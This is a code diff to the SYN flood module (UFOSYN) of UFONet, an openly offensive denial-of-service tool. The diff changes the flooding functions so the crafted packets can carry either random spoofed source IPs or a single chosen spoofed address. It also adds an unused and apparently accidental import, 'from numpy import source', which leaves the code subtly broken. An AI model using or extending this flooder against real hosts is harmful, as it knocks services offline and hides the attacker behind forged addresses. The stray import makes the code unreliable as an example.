@@ -10,6 +10,8 @@ with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random, socket, time
+
+from numpy import source
 try:
     from urlparse import urlparse
 except:
@@ -29,7 +31,7 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x	
 
-def synize(ip, port, rounds):
+def synize(ip, port, rounds, source_ip = None):
     n=0
     try:
         for x in range (0,int(rounds)):
@@ -38,7 +40,10 @@ def synize(ip, port, rounds):
             seq = randInt()
             window = randInt()
             IP_p = IP()
-            IP_p.src = randIP()
+            if source_ip is None:
+                IP_p.src = randIP()
+            else:
+                IP_p.src = source_ip
             try:
                 IP_p.dst = ip
             except:
@@ -60,7 +65,7 @@ def synize(ip, port, rounds):
         print("[Error] [AI] [UFOSYN] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class UFOSYN(object):
-    def attacking(self, target, rounds):
+    def attacking(self, target, rounds, source = None):
         print("[Info] [AI] TCP SYN Flooder (UFOSYN) is ready to fire: [" , rounds, "quantum hooks ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
